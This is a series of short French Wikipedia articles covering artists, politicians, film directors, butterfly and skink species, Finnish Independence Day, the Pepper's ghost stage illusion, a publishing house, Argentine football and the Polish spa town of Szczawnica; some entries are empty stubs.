<doc id="6805316" url="https://fr.wikipedia.org/wiki?curid=6805316" title="Kiyoshi Hasegawa">
Kiyoshi Hasegawa

, né le à Yokohama et mort le à Paris, est un peintre et graveur japonais.
Biographie.
Kiyoshi Hasegawa est un peintre de paysages animés, de natures mortes, de fleurs, peintre à la gouache, aquarelliste, graveur, illustrateur. Après être sorti diplômé de l'université Meiji de Tokyo, il étudie la peinture à l'huile avec Okada Saburōsuke (1869-1939) et Fujishima Takeji. En 1912, il commence à pratiquer la gravure sur bois et, en 1913, la gravure sur cuivre.
Après un bref séjour aux États-Unis en 1918, il vient à Paris dès 1919, où il fera toute sa carrière. Il expose à partir de 1923, à divers salons dont le Salon d'automne, où il est sociétaire et même membre du jury en 1961, le salon des Tuileries, des indépendants, de la Société nationale des beaux-arts, dont il est membre du jury en 1964. En 1934, il participe à l'organisation d'une importante exposition d'estampes japonaises modernes, destinée à être exposée dans plusieurs capitales.
Depuis 1957, Hasegawa figure à la biennale internationale d'estampes de Tokyo. En 1965, il figure à la grande exposition du musée d'art moderne de la ville de Paris consacrée aux artistes japonais résidant à l'étranger.
Il a illustré plusieurs ouvrages littéraires traduits du japonais.
Prix et distinctions.
Il est membre de la Société des peintres-graveurs français, de l'Association japonaise de gravure et, à partir de 1964, membre de l'Académie des beaux-arts.
Style et technique.
Hasegawa a produit près de entre 1919 et 1963, sans compter sa production entre 1916 et 1919 au Japon, évaluée à moins de .
Peu après son arrivée à Paris, il fonde sa réputation par ses compétences techniques, en introduisant en France la gravure en manière noire, et la gravure sur bois à partir d'à-plats noirs introduisant un jeu de contrastes, qu'il pratique préférentiellement à partir de 1924 et dont il exploite largement les contrastes de valeurs, obtenant de effets incomparables par la richesse et la profondeur des harmonies extraites du noir.
Dès ses débuts apparaît dans sa peinture le désir de concilier la tradition japonaise à l'art occidental moderne qu'il inculque à l'une de ses élèves, Hasegawa Haruko. À cette époque, il s'implique, à l'encre et en gravure, dans le mouvement abstrait. Il évolue progressivement à une manière plus figurative, avec de vastes paysages aux couleurs mouillées en larges taches sur des fonds de motifs graphiques entremêlés, avec aussi des thèmes de fleurs et oiseaux, des nus. Il crée, dans une production abondante, un monde microscopique, translucide, calme et contenu. Il avait épousé Micheline Bianchi (1893-1982).
Musées.
Certaines de ses œuvres sont conservées dans les musées :
Une partie des archives de Hasegawa est conservée à l'Institut national d'histoire de l'art.

</doc>
<doc id="6805318" url="https://fr.wikipedia.org/wiki?curid=6805318" title="Chrysè">
Chrysè



</doc>
<doc id="6805320" url="https://fr.wikipedia.org/wiki?curid=6805320" title="Hartmut Häussermann">
Hartmut Häussermann

Hartmut Häußermann, né le à Waiblingen et mort le à Berlin, est un sociologue et urbaniste allemand.
Biographie.
Hartmut Häußermann a étudié à partir de 1964 à l'université libre de Berlin, où il est président de l' à partir de 1967 et où il obtient en 1970 son diplôme de sociologie. Il obtient son doctorat en 1975 sous la direction de Urs Jaeggi.
Il a été professeur de sociologie régionale et urbaine à l'université de Cassel (1976–1978), à l'université de Brême (1978–1993) et à l'université Humboldt de Berlin (1993–2008). De 2002 à 2006, il a été président du comité de recherche sur le développement régional et urbain (Research Committee on Regional and Urban Development) de l'Association internationale de sociologie (ISA).
En 1993, il a gagné le deuxième prix de la Fondation Fritz Thyssen pour le meilleur article de sciences sociales publié dans une revue allemande (avec Manfred Küchler) ; en 2003 il a gagné le prix de la Fondation Schader avec Walter Siebel, et un an plus tard, le prix Fritz-Schumacher de la Fondation Alfred Toepfer. Il était depuis 1999 membre de l', et de l'.
En 1998, il a terminé une recherche menée avec le géographe Andreas Kapphan et commanditée par le Sénat de Berlin, portant sur le développement et la structure socio-spatiale du Land de Berlin, dans lequel il propose l'introduction d'une gestion de quartier „Quartiersmanagements“ . Le Sénat de Berlin a suivi cette recommandation, en réponse à la polarisation sociale croissante de l'espace et au danger d'exclusion de certains groupes de population. Häusserman a également dirigé, en 1995, l'évaluation du programme "La ville sociale".
En , il était le premier signataire de la lettre ouverte à la procureur générale fédérale , demandant la libération d'Andrej Holm, un de ses collègues de chaire soupçonné de terrorisme et placé en détention provisoire.
Häusserman avait une fille, et vivait à Berlin-Prenzlauer Berg.

</doc>
<doc id="6805321" url="https://fr.wikipedia.org/wiki?curid=6805321" title="Oscar de Schaetzen">
Oscar de Schaetzen

Le chevalier Oscar Joseph de Schaetzen, né le à Tongres et mort dans sa ville natale le est un homme politique belge bilingue, membre du parti catholique.
Éléments biographiques.
Il fut banquier, fondateur de la banque "Alphonse Slegers, Oscar Schaetzen et "(1873), de l'agence "Caisse générale d'Épargne et de Retraite" (1875) et de la "O. Schaetzen et " (1881); secrétaire (1859-66), puis président de l’"Association Saint-Vincent-de-Paul" à Tongres (1872-81). Par ailleurs, il fut membre de la "Société scientifique et littéraire du Limbourg" (1861), de la "Commission royale des monuments et des sites" (1872-1907), de la "Société d'Art et d'Histoire du Diocèse de Liège", du CA de l'hôpital civil de Tongres ; président du "Davidsfonds" (1875), du fonds de soutien "Het Burgerwelzijn" (1890), de la fabrique d'église "OLV Tongres" (1887-1905) et vice-président de la "Société scientifique et littéraire du Limbourg" (1897-1907).
Il fut créé chevalier en 1876.
Généalogie.
et en secondes noces, en 1865, "Marie de Corswarem" (1845-1919), ils eurent onze enfants, parmi lesquels trois fils eurent une descendance :

</doc>
<doc id="6805322" url="https://fr.wikipedia.org/wiki?curid=6805322" title="Schlitzor">
Schlitzor



</doc>
<doc id="6805323" url="https://fr.wikipedia.org/wiki?curid=6805323" title="Sadatsugu Matsuda">
Sadatsugu Matsuda

, né le à Kyoto et mort le à Tokyo, est un directeur de la photographie et un réalisateur japonais. Son nom est parfois incorrectement écrit Sadaji Matsuda.
Biographie.
Sadatsugu Matsuda a réalisé près de 160 films entre 1928 et 1969, il a également été directeur de la photographie sur une trentaine de films au début de sa carrière entre 1925 et 1928.
Il est le fils de Shōzō Makino et le frère de Masahiro Makino.

</doc>
<doc id="6805326" url="https://fr.wikipedia.org/wiki?curid=6805326" title="Jour de l'indépendance de la Finlande">
Jour de l'indépendance de la Finlande

Le jour de l'indépendance de la Finlande (, ) est un jour férié qui a lieu le 6 décembre pour célébrer la Déclaration d'indépendance finlandaise de la République socialiste fédérative soviétique de Russie.
Histoire.
Le mouvement pour l'indépendance débute après la Révolution russe à la suite de la défaite de la Première Guerre mondiale. Après plusieurs désaccords entre les partis en présence concernant qui aurait le pouvoir après l'indépendance, le Sénat mené par Pehr Evind Svinhufvud, déclare l’indépendance le . L'indépendance sera adoptée par le parlement deux jours plus tard, le .
Commémoration.
Depuis 1957, la commémoration officielle débute sur la colline de l'observatoire d'Helsinki. Elle débute à 9 heures par un lever solennel du drapeau. On y prononce des discours et des chœurs chantent. L'organisateur de la cérémonie est l'Association pour la culture et l'identité finnoise, les scouts du NMKY:n Katajat hissent le drapeau et parmi les chorales on peut citer l'une des plus anciennes chorales de Finlande les Viipurin Lauluveikot. La cérémonie est radiodiffusée en direct.
Une messe est donnée à la Cathédrale. Depuis 1998 la messe est œcuménique. Assistent à la messe les plus hauts dirigeants de l'État dont le Président de la République de Finlande, le Conseil d'État, le président du parlement et les députés. Le culte est télédiffusé.
Puis les invités officiels se recueillent au Carré militaire du Cimetière de Hietaniemi devant les monuments en mémoire des héros de la Seconde Guerre mondiale. On pose des cierges sur de nombreuses tombes et les réservistes font une haie d'honneur.
Dans la soirée la "Réception présidentielle du jour de l'indépendance" se tient au Palais présidentiel avec près de 2000 invités. La première réception a eu lieu en 1919 et a eu lieu presque chaque année depuis lors.

</doc>
<doc id="6805327" url="https://fr.wikipedia.org/wiki?curid=6805327" title="Rapides et Dangereux 2">
Rapides et Dangereux 2



</doc>
<doc id="6805328" url="https://fr.wikipedia.org/wiki?curid=6805328" title="Épistrophe fils d'Événos">
Épistrophe fils d'Événos

Dans la mythologie grecque, Épistrophe (en grec ancien / "Epistrophos") est le fils d'Événos (roi de Lyrnessos) et le frère de Mynès. Il est tué par Achille lorsque celui-ci prend la ville pendant la guerre de Troie.

</doc>
<doc id="6805330" url="https://fr.wikipedia.org/wiki?curid=6805330" title="Chbah essafra">
Chbah essafra

Le chbah essafra est une spécialité constantinoise. C'est un plat sucré préparé à base d'amandes finement moulues et de viande rouge, présent pendant le ramadan et dans les cérémonies de mariage.
Origine et étymologie.
"Chbeh" signifie « embellir » et "essafra", "esofra" (السفرة) en arabe qui signifie « table ». 
Ce plat garni embellit les tables constantinoises lors des mariages et du mois de ramadan.
Préparation.
Le "chbeh essafra" est constitué de viande d'agneau cuite dans une sauce sucrée qui contient de l'oignon, du "smen", du sucre et qui est parfumée à la cannelle, au safran et à l'eau de fleur d'oranger ou à l'eau de rose, accompagné de beignets de pâte d'amande qu'on aura frits avant de les ajouter à la sauce sucrée.

</doc>
<doc id="6805331" url="https://fr.wikipedia.org/wiki?curid=6805331" title="Lamprospilus genius">
Lamprospilus genius

Lamprospilus genius est une espèce d'insectes lépidoptères (papillons) appartenant à la famille des Lycaenidae, à la sous-famille des Theclinae et au genre "Lamprospilus".
Dénomination.
"Lamprospilus genius" a été décrit par Carl Geyer en 1832.
Synonymes : "Thecla teatea" Hewitson, 1868; "Thecla genius", Hewitson, 1877.
Description.
"Lamprospilus genius" est un petit papillon aux antennes et aux pattes annelées de blanc et de marron, avec deux fines queues, dont une très longue à chaque aile postérieure.
Le dessus marron.
Le revers est marron plus clair orné aux ailes antérieures d'une ligne postdiscale et d'une ligne submarginale blanches, aux ailes postérieures d'une ligne postdiscale blanche et de deux gros ocelles orange pupillés d'un chevron noir, situés un entre les deux queues et un à l'angle anal.
Écologie et distribution.
"Lamprospilus genius" est présent au Brésil, au Surinam et en Guyane.
Protection.
Pas de statut de protection particulier.

</doc>
<doc id="6805333" url="https://fr.wikipedia.org/wiki?curid=6805333" title="Aspris berdmorei">
Aspris berdmorei



</doc>
<doc id="6805335" url="https://fr.wikipedia.org/wiki?curid=6805335" title="Tropidophorus yunnanensis">
Tropidophorus yunnanensis



</doc>
<doc id="6805336" url="https://fr.wikipedia.org/wiki?curid=6805336" title="Tropidophorus berdmorei">
Tropidophorus berdmorei

Tropidophorus berdmorei est une espèce de sauriens de la famille des Scincidae.
Répartition.
Cette espèce se rencontre en République populaire de Chine dans la province du Yunnan, en Birmanie, en Thaïlande et au Viêt Nam.
Étymologie.
Cette espèce est nommée en l'honneur de Thomas Matthew Berdmore (1811–1859).

</doc>
<doc id="6805339" url="https://fr.wikipedia.org/wiki?curid=6805339" title="Lamprospilus coelicolor">
Lamprospilus coelicolor

Lamprospilus coelicolor est une espèce d'insectes lépidoptères (papillons) appartenant à la famille des Lycaenidae, à la sous-famille des Theclinae et au genre "Lamprospilus".
Dénomination.
"Lamprospilus coelicolor" a été décrit par Arthur Gardiner Butler et Herbert Druce en 1872 sous le nom initial de "Strymon coelicolor".
Synonymes : "Thecla myrsina" Hewitson, 1874; "Thecla hena" Hewitson, 1874.
Nom vernaculaire.
"Lamprospilus coelicolor" se nomme Central American Groundstreak en anglais.
Description.
"Lamprospilus coelicolor" est un petit papillon aux antennes et aux pattes annelées de blanc et de marron, avec deux fines queues, une longue et une courte à chaque aile postérieure.
Le dessus est bleu clair métallise veiné et largement bordé de marron.
Le revers est beige orné aux ailes antérieures et aux ailes postérieures d'une ligne postdiscale et d'une ligne submarginale blanches, et aux ailes postérieures de deux gros ocelles orange pupillés de marron, situés un entre les deux queues et un à l'angle anal.
Écologie et distribution.
"Lamprospilus coelicolor" est présent au Mexique, au Costa Rica, au Nicaragua, à Panama, en Colombie et en Guyane.
Protection.
Pas de statut de protection particulier.

</doc>
<doc id="6805342" url="https://fr.wikipedia.org/wiki?curid=6805342" title="Norbea brookei">
Norbea brookei



</doc>
<doc id="6805343" url="https://fr.wikipedia.org/wiki?curid=6805343" title="Tropidophorus brookei">
Tropidophorus brookei

Tropidophorus brookei est une espèce de sauriens de la famille des Scincidae.
Répartition.
Cette espèce est endémique de Bornéo. Elle se rencontre au Kalimantan en Indonésie et dans les États du Sabah et du Sarawak en Malaisie orientale.
Étymologie.
Cette espèce est nommée en l'honneur de James Brooke (1803–1868).

</doc>
<doc id="6805344" url="https://fr.wikipedia.org/wiki?curid=6805344" title="Tasset">
Tasset



</doc>
<doc id="6805347" url="https://fr.wikipedia.org/wiki?curid=6805347" title="King George Square">
King George Square

King George Square est une place publique de Brisbane, dans le Queensland, en Australie. Située dans le centre d'affaires de Brisbane, elle dessert l'hôtel de ville de Brisbane.
Un trio de statues orne la place. L'une immortalise Emma Miller organisatrice syndicale pionnière née en Angleterre, suffragette et figure clé d'organisations qui ont conduit à la fondation du Parti travailliste australien à Brisbane. Les deux autres représentent l'écrivain Steele Rudd et Sir Charles Lilley.

</doc>
<doc id="6805350" url="https://fr.wikipedia.org/wiki?curid=6805350" title="Unité urbaine de Millau">
Unité urbaine de Millau

L'unité urbaine de Millau est une unité urbaine française centrée sur Millau, une des sous-préfectures de l'Aveyron, au cœur de la deuxième agglomération urbaine du département.
Données générales.
En 2010, selon l'INSEE, l"'unité urbaine de Millau" était composée de deux communes, toutes deux situées dans le département de l'Aveyron, plus précisément dans l'arrondissement de Millau.
Dans le zonage de 2020, elle est composée des deux mêmes communes.
En , avec , elle représente la urbaine du département de l'Aveyron, après l'unité urbaine de Rodez ( départemental et préfecture du département). Elle occupe le régional après l'unité urbaine de Cahors ( régional) et avant la partie occitane de l'unité urbaine d'Avignon qui se positionne au régional, dans la région Occitanie.
En 2022, sa densité de population s'élève à . Par sa superficie, elle ne représente que 2,25 % du territoire départemental mais, par sa population, elle regroupe 8,37 % de la population du département de l'Aveyron.
Composition 2020 de l'unité urbaine.
Elle est composée des deux communes suivantes :
Évolution démographique.
L'évolution démographique ci-dessous concerne l'unité urbaine selon le périmètre défini en 2020.

</doc>
<doc id="6805355" url="https://fr.wikipedia.org/wiki?curid=6805355" title="Fantôme de Pepper">
Fantôme de Pepper

Le fantôme de Pepper ou spectre de Pepper (en anglais ), connu également sous le nom de fantôme de Dircks, est une technique d'illusion d'optique utilisée dans les représentations scéniques (théâtre, concerts, meetings), les maisons hantées et dans certains tours de magie.
Utilisant une plaque semi-réfléchissante (verre métallisé ou film plastique) et des techniques d'éclairage particulières, elle permet de faire croire que des objets apparaissent, disparaissent ou deviennent transparents, ou qu'un objet se transforme en un autre. Le nom de cette méthode est tiré du nom de John Henry Pepper, qui a popularisé cet effet. Le terme est occasionnellement traduit en français par erreur par « fantôme de poivre ».
Technique.
Pour que l'illusion fonctionne, il faut que le spectateur puisse voir à l'intérieur de la pièce principale, mais pas dans la pièce cachée (aussi appelée « blue room »). La tranche de la plaque de verre est parfois masquée par un motif adapté dessiné sur le sol.
La pièce cachée devrait être une image identique, comme un reflet dans un miroir, de la pièce principale, de sorte que l'image de la pièce principale et celle de la pièce cachée se correspondent. Cette façon de faire est utile si on souhaite faire croire à l'apparition ou la disparition d'objets. Cette illusion peut aussi être utilisée pour faire en sorte que la personne ou l'objet reflété dans le miroir semble se fondre dans un autre qui se trouve derrière la vitre (et vice-versa). C'est le principe utilisé dans l'effet « girl-to-gorilla » que l'on trouvait dans les vieilles attractions de carnaval et dans le film de James Bond "Les diamants sont éternels".
La pièce cachée doit être de préférence peinte en noir, avec seulement des objets de couleur claire à l'intérieur. Dans ce cas, quand la lumière est projetée dans la pièce, seuls les objets clairs reflètent la lumière et apparaissent comme des images fantomatiques translucides superposées à la pièce visible.
Dans la scène de la salle de bal des attractions "Haunted Mansion" / "Phantom Manor" des parcs Disney, la vitre est verticale au lieu d'être inclinée, réfléchissant les audio-animatronics en dessous et au-dessus du visiteur, ce qui créé l'illusion de « fantômes » en trois dimensions translucides, qui apparaissent comme assis à une grande table et dansant à travers la salle de bal. Ces personnages apparaissent et disparaissent lorsque les lumières projetées sur les audio-animatronics sont allumées puis éteintes.
Histoire.
La première attestation d'un tel effet se trouve dans l'ouvrage de vulgarisation scientifique "Magia naturalis" de Giambattista della Porta, érudit italien particulièrement versé dans l'optique, daté de 1558.
Cette technique s'est développée dans le monde de l'illusion dans la seconde moitié du . Le premier à avoir présenté un tel dispositif semble être le prestidigitateur hollandais Henri Robin (1811-1874) - de son vrai nom Henrik Joseph Donckel - qui réclamait la paternité de l'illusion : mise au point entre 1845 et 1847, elle a été présentée à Paris puis dans diverses villes d'Europe sous le nom de « Fantasmagorie vivante ». En 1852, un brevet pour un appareil de loisir appelé "polyoscope" utilisant la même technique est déposé en France par l'artiste peintre Pierre Séguin qui avait travaillé pour Henri Robin.
Mais cette illusion doit son nom habituel au chimiste John Henry Pepper, directeur du "Royal Polytechnic Institution", un établissement public de vulgarisation scientifique lié à la future université de Westminster : ce dernier a acheté un dispositif - alors appelé « Aetheroscope » - créé par l'ingénieur et inventeur Henri Dirks vers 1858 et le développe comme illusion théâtrale.
Pepper perfectionne l'invention de Dirks qui est utilisée pour la première fois à Londres dans une représentation de la pièce "L'Homme hanté ou le Pacte du fantôme" ("The Haunted Man or the Ghost's Bargain") de Charles Dickens pour le réveillon de Noël 1862. Le procédé est copié par de nombreux théâtres qui doivent bientôt s'acquitter de royalties auprès de Pepper, fixant le nom de l'illusion.
L'attraction a connu un grand succès au Royaume-Uni et en France, où, après l'installation de l'illusion de Pepper à Paris au théâtre du Châtelet en 1863, les attractions de ce type se sont multipliées dans les salles .
La scène du "Château des Carpathes" de Jules Verne, le « simple artifice d'optique qu'a mis au point l'inventeur maudit Orfanik et qui permet à Rodolphe de Gortz de revoir Stillia en scène est probablement inspiré du miroir de Pepper. »
Exemples contemporains.
En 1958, l'inventeur, écrivain et journaliste Hugo Gernsback imagine le TV Phantomcast, qui est une captation en télévision de l'image d'un objet produite par un miroir de Pepper.
Certains parcs d'attractions utilisent la technique du fantôme de Pepper. L'exemple le plus connu est utilisé dans les parcs Disney, les trains fantôme "Haunted Mansion" et leur déclinaisons. "Le Passage enchanté d'Aladdin" et "Pinocchio's Daring Journey" ont recours aussi à cet effet. D'autres attractions telles "Djengu River" à Toverland, "Los Piratas" et "Le Palais d'Ali Baba" utilisent la même technique. L'attraction "" à Universal Studios Florida utilise cet effet, de sorte que les promeneurs entrant dans la « voie » semblent disparaître dans un mur de briques pour ceux qui les observent en aval dans la file d'attente. À Efteling, "Spookslot", "Droomvlucht", "Fata Morgana" utilisent la technique du fantôme de Pepper. Les contes "Le Rossignol et l'Empereur de Chine", "La petite table, l'âne et le bâton" et "Pinocchio" font de même dans le Bois des Contes.
Lors des Grammy Awards 2006, Madonna effectue un « duo » avec les personnages du groupe Gorillaz, projetés sur scène en utilisant l'illusion de Pepper.
En 2012, au Coachella Valley Music and Arts Festival, c'est Snoop Dogg qui utilise cette illusion pour un duo avec le rappeur décédé Tupac.
Bruno Cohen, scénographe et réalisateur, réintroduit ces techniques en 1991 dans différents musées de France et à l'occasion de ses travaux d'artistes ( ZKM Karlsruhe, "mais l'ange" ou des-illusions, ars numerica)
En 2017 le spectacle "Hit Parade" mettait en scène des reproductions numériques d'artistes des années 70 en transparence accompagnés sur scène de danseurs réels.
Jean-Luc Mélenchon, le 5 février 2017 a, pour la première fois en France, donné un discours politique simultanément à Lyon et à Aubervilliers (Seine-Saint-Denis) grâce à cette technologie, abusivement nommée hologramme à l'occasion.
Pour des utilisations hors scénographie sur le même principe, on parle plus souvent de "vitrine virtuelle" ou simplement de "vitrine", mais la confusion avec les hologrammes est tout aussi fréquente. Ces appareils appartiennent à la famille des affichages transparents.

</doc>
<doc id="6805356" url="https://fr.wikipedia.org/wiki?curid=6805356" title="Tropidophorus grayi">
Tropidophorus grayi

Tropidophorus grayi est une espèce de sauriens de la famille des Scincidae.
Répartition.
Cette espèce est endémique des Philippines. Elle se rencontre sur les îles de Luçon, de Polillo, de Masbate, de Panay, de Negros, de Leyte, de Cebu, de Catanduanes et de Samar.
Étymologie.
Cette espèce est nommée en l'honneur de John Edward Gray.

</doc>
<doc id="6805358" url="https://fr.wikipedia.org/wiki?curid=6805358" title="Enoplosaurus insignis">
Enoplosaurus insignis



</doc>
<doc id="6805361" url="https://fr.wikipedia.org/wiki?curid=6805361" title="Paulin Tasset">
Paulin Tasset

Ernest Paulin Tasset, connu sous le nom de Paulin Tasset, né à Paris le et mort dans la même ville le , est un graveur en médailles, monnaies et timbres français.
Biographie.
Paulin Tasset naît à Paris le .
Il fut l'élève d'Eugène-André Oudiné (1810-1887) à l'École des beaux-arts de Paris entre 1860 et 1862.
Le graveur est l'auteur de nombreuses médailles qu'il conçut principalement dans ses ateliers parisiens (37 rue Mazarine de 1870 à 1890, 3 rue Séguier de 1891 à 1903, 127 bd Raspail de 1904 à 1921), ainsi qu'au 17 rue de Clamart (actuelle rue André-Salel) à Fontenay-aux-Roses.
Tasset travailla aussi pour la Monnaie de Paris où il créa de nombreux outillages monétaires, à l'instar de la Bolivie, du Brésil, de la Serbie, de l'Uruguay ou encore de la République Dominicaine.
Il reçoit les insignes de chevalier de la Légion d'honneur en 1895.
Le médailleur décède dans le 6 arrondissement de Paris le .

</doc>
<doc id="6805363" url="https://fr.wikipedia.org/wiki?curid=6805363" title="Éditions De Vecchi">
Éditions De Vecchi

Les éditions De Vecchi sont une maison d'édition italienne spécialisée dans les ouvrages sur les animaux, l'ésotérisme, et le développement personnel et spirituel.
Histoire.
La maison d'édition De Vecchi (Giovanni De Vecchi Editore SpA) est fondée en Italie en 1962 par Giovanni De Vecchi, un italo-suisse. L'entreprise est initialement scindée en 2 structures: la publication d'un côté, la diffusion de l'autre. 
De 1972 à 1999, les éditions De Vecchi se développent notamment sur le marché du livre sur les animaux, le marché de l’ésotérisme/sciences humaines. En 1999, De Vecchi lance la collection « Grands Procès de l'Histoire ». Cette collection est éventuellement stoppée par le droit des familles et des victimes qui freine la publication de certaines informations. Ses titres étaient parfois repris au micro de l'émission radio "Café crimes""." 
En les éditions De Vecchi sont alors reprises par le groupe Albin Michel. En 2006, la maison d'édition Larus (Bergamo) reprend De Vecchi Italie. En , Giunti Editore rachète les activités italiennes de De Vecchi France à Albin Michel pour consolider sa position sur le marché domestique. Entre 2008 et 2011, le groupe Albin Michel cède la filière espagnole, puis la filière mexicaine. 
En , les éditions De Vecchi France sont reprises par la société Le Livre Club.
En , les éditions De Vecchi changent de diffuseur distributeur et rejoignent l'équipe de Laurent Fontaine du groupe Centre France (CF2D) et la logistique est confiée à la SODIS. En , De Vecchi lance une collection de vulgarisation des sujets ésotériques avec un prix fixe de 3 euros l'ouvrage.
Description.
La maison d'édition De Vecchi est spécialisée dans les ouvrages sur les animaux, l'ésotérisme, et le développement personnel/spirituel. Ses best-sellers sont ses ouvrages sur les chiens et son guide légal "L'avocat dans le tiroir". Le catalogue De Vecchi compte près de 250 titres. 

</doc>
<doc id="6805364" url="https://fr.wikipedia.org/wiki?curid=6805364" title="Brisbane Transit Centre">
Brisbane Transit Centre

Le Brisbane Transit Centre est une gare ferroviaire et routière de Brisbane, dans le Queensland, en Australie. Il est situé immédiatement au nord-ouest du centre d'affaires de Brisbane.

</doc>
<doc id="6805368" url="https://fr.wikipedia.org/wiki?curid=6805368" title="Georges de Schaetzen">
Georges de Schaetzen

Le chevalier Georges Oscar Joseph de Schaetzen van Brienen, né le à Tongres et y décédé le est un homme politique belge bilingue, membre du parti catholique, tendance ouvrière ("Christen Werkersverbond").
Licencié en sciences sociales et politiques, il fut fondateur et administrateur de diverses coopératives ouvrières chrétiennes, parmi lesquelles : "Le Bien-Être" (1910), "Coopération Ouvrière Belge" (1924), "Banque d'Epargne des Ouvriers Chrétiens " (1925), "Assurances Populaires" (1929) et "Fédération Nationale des Coopératives Chrétiennes" (1935).

</doc>
<doc id="6805369" url="https://fr.wikipedia.org/wiki?curid=6805369" title="Tournoi d'ouverture du championnat d'Argentine de football 2009">
Tournoi d'ouverture du championnat d'Argentine de football 2009

Le tournoi d'ouverture de la saison 2009 du Championnat d'Argentine de football est le premier tournoi semestriel de la du championnat de première division en Argentine. Les vingt équipes sont regroupées au sein d'une poule unique où elles affrontent une fois chacun de leurs adversaires. Il n'y a ni promotion, ni relégation à l'issue de ce tournoi.
C'est le Banfield qui remporte le tournoi après avoir terminé en tête du classement final, avec deux points d'avance sur Newell's Old Boys (Rosario) et sept sur un trio composé du Colón (Santa Fe), du Independiente et du tenant du titre, Vélez Sarsfield. C'est le tout premier titre de champion d'Argentine de l'histoire du club.
Qualifications continentales.
Un classement cumulé des tournois de l'année 2009 permet de désigner les cinq clubs engagés en Copa Libertadores : les deux vainqueurs des tournois semestriels puis les trois meilleures équipes non encore qualifiées au classement cumulé. De plus, Estudiantes (La Plata) obtient sa qualification automatique en tant que tenant du trophée.
Compétition.
Le barème utilisé pour établir le classement est le suivant :
Qualification pour la Copa Libertadores 2010.
Un classement cumulé des deux derniers tournois disputés (Clôture 2009 et Ouverture 2009) permet de distribuer les cinq places attribuées à la fédération argentine. Les deux vainqueurs des tournois sont automatiquement qualifiés pour le premier tour tout comme le meilleur non-qualifié au classement cumulé tandis que les deuxièmes et troisièmes de ce classement doivent démarrer en tour préliminaire. Estudiantes (La Plata), en tant que tenant du titre, se qualifie automatiquement pour le premier tour.

</doc>
<doc id="6805370" url="https://fr.wikipedia.org/wiki?curid=6805370" title="Michael Johann von Traubenberg">
Michael Johann von Traubenberg

Michael-Johannes von Traubenberg ("Траубенберг, Михаил Михайлович" en russe) (1722-1772) est un baron germano-balte, major-général russe commandant de la ligne du Gouvernement d'Orenbourg. Il est assassiné lors de la révolte cosaque de 1772, prémices de la guerre des Paysans russes (1773-1775).

</doc>
<doc id="6805372" url="https://fr.wikipedia.org/wiki?curid=6805372" title="Copa Libertadores 2013">
Copa Libertadores 2013

La Copa Libertadores 2013 est la de la Copa Libertadores. Le club vainqueur de la compétition est désigné champion d'Amérique du Sud 2013. Le vainqueur représente la CONMEBOL lors de la Coupe du monde de football des clubs 2013.
Compétition.
Phase finale.
Tournoi final.
• 

</doc>
<doc id="6805373" url="https://fr.wikipedia.org/wiki?curid=6805373" title="Défense d'aimer (film, 1984)">
Défense d'aimer (film, 1984)

Défense d'aimer ("") est un film d'Anthony Page sorti en 1984, basé sur une histoire vraie.
Synopsis.
La comtesse allemande Nina von Halder tombe amoureuse de Fritz Friedlander, qui est juif et déjà marié.

</doc>
<doc id="6805375" url="https://fr.wikipedia.org/wiki?curid=6805375" title="Chaîne du Koksou">
Chaîne du Koksou

La chaîne du Koksou (en russe : Коксуйский хребет) est un chaînon d'une longueur de 70 kilomètres qui se trouve dans le Tian Shan occidental, à la frontière du Kirghizistan et de l'Ouzbékistan. Son altitude moyenne est de . Son point culminant est le mont Aktach (). Elle est bordée au sud-ouest par la vallée profonde du Koksou, rivière d'après laquelle la chaîne a été nommée qui se jette dans le lac Tcharvak.
D'après le géographe Vladimir Popov dans son livre "Le Tian Shan occidental" : 

</doc>
<doc id="6805376" url="https://fr.wikipedia.org/wiki?curid=6805376" title="Seiji Hisamatsu">
Seiji Hisamatsu

, né le et mort le , est un réalisateur japonais.
Biographie.
Seiji Hisamatsu dirige 101 films entre 1934 et 1965.
Distinctions.
"Calendrier de femmes" est sélectionné en compétition lors du festival de Cannes 1955.

</doc>
<doc id="6805378" url="https://fr.wikipedia.org/wiki?curid=6805378" title="Lamprospilus canacha">
Lamprospilus canacha

Lamprospilus canacha est une espèce d'insectes lépidoptères (papillons) appartenant à la famille des Lycaenidae, à la sous-famille des Theclinae et au genre "Lamprospilus".
Dénomination.
"Lamprospilus canacha" a été décrit par William Chapman Hewitson en 1877, sous le nom initial de "Thecla orcidia".
Synonyme : "Ziegleria compendina" Johnson, 1993.
Écologie et distribution.
"Lamprospilus canacha" est présent au Venezuela et en Colombie, sa présence n'est pas confirmée en Guyane.
Protection.
Pas de statut de protection particulier.

</doc>
<doc id="6805379" url="https://fr.wikipedia.org/wiki?curid=6805379" title="Défense d'aimer">
Défense d'aimer



</doc>
<doc id="6805380" url="https://fr.wikipedia.org/wiki?curid=6805380" title="Tropidophorus mocquardi">
Tropidophorus mocquardi



</doc>
<doc id="6805384" url="https://fr.wikipedia.org/wiki?curid=6805384" title="Tropidophorus mocquardii">
Tropidophorus mocquardii

Tropidophorus mocquardii est une espèce de sauriens de la famille des Scincidae.
Répartition.
Cette espèce est endémique de Malaisie orientale.
Étymologie.
Cette espèce est nommée en l'honneur de François Mocquard.

</doc>
<doc id="6805387" url="https://fr.wikipedia.org/wiki?curid=6805387" title="Szczawnica">
Szczawnica

Szczawnica est une ville de Pologne, située dans le sud du pays, dans la voïvodie de Petite-Pologne. Elle est le chef-lieu de la gmina de Szczawnica, dans le powiat de Nowy Targ.
Histoire.
Le nom de la ville trouve ses origines dans les eaux acides nommées par les montagnards "szczawy". La première mention historique de la station date du début du . Jusqu’à la fin du , Szczawnica faisait partie de la Starostie de Czorsztyń. En 1839, Józef Stefan Szalay reprit l’administration des biens de Szczawnica et c’est alors que débuta l’essor de la station thermale.
Le milieu du voit la ville se développer dynamiquement grâce à la vision de Józef Dietl, médecin et promoteur des stations thermales polonaises qui se rendit à Szcawnica en 1857. Séduit par les lieux, il donna l’impulsion pour développer le thermalisme en respectant déjà les normes des stations européennes. Rapidement de nouveaux établissements thermaux voient le jour. Les sources d’eaux thermales sont découvertes les unes après les autres. Avant de mourir, Józef Szalay céda l’administration de son Établissement Thermal à l’Académie Polonaise de la Connaissance à Cracovie, qui continua l’ouvrage visionnaire de son fondateur, malgré les difficultés financières. C’est ainsi que Dworek Gościnny (le Manoir Hospitalier), reconnu dans toute l’Europe, fut construit.
